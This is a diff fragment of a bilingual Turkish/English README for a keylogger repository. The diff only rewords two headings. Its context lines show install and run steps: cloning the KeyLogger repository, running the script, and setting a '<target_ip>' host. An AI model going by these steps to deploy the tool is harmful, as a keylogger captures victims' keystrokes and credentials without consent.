@@ -9,7 +9,7 @@
 * `MİNT`
 * `TERMUX`
 * `ARCH`
-# YÜKLEME KOMUTLARI | LOAD COMMANDS
+# YÜKLEME KOMUTLARI | The load commands
   
 * `apt-get install python -y | apt-get install python2 -y`
 * `git clone https://github.com/By-Emirhan/KeyLogger.git`  
@@ -18,7 +18,7 @@
 ##### Çalıştırmak İçin >>> `python KeyLogger.py`
 ##### Termux İçin >>> `python2 KeyLogger.py`
 
-# `ÇALIŞTIRMA KOMUTLARI | RUN COMMANDS
+# `ÇALIŞTIRMA KOMUTLARI | The run's commands
 
 * show
 * set host <target_ip>
